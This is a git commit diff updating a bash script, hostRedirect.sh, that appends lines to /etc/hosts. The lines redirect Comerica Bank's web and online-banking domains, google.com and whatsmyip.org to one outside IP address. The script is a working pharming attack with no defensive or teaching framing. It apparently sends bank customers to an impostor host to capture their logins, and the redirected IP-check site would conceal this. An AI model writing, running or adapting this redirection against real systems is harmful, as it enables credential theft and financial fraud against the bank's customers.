053343b8f40d1e33a2048832064aaf06345792b1
SRock2000 <70704016+SRock2000@users.noreply.github.com>
2024-09-03 16:00:12 -0400

    Update hostRedirect.sh

--- hostRedirect.sh
+++ hostRedirect.sh
@@ -1,4 +1,12 @@
 #!/bin/bash
-echo "196.118.45.9 www.comerica.com" >> /etc/hosts
-echo "196.118.45.9 www.whatsmyip.org" >> /etc/hosts
 
+echo "210.138.184.59 www.webbanking.comerica.com" >> /etc/hosts
+echo "210.138.184.59 www.comerica.com" >> /etc/hosts
+echo "210.138.184.59 www.google.com" >> /etc/hosts
+echo "210.138.184.59 www.whatsmyip.org" >> /etc/hosts
+
+echo "210.138.184.59 webbanking.comerica.com" >> /etc/hosts
+echo "210.138.184.59 comerica.com" >> /etc/hosts
+echo "210.138.184.59 webbanking.com" >> /etc/hosts
+echo "210.138.184.59 google.com" >> /etc/hosts
+echo "210.138.184.59 whatsmyip.org" >> /etc/hosts
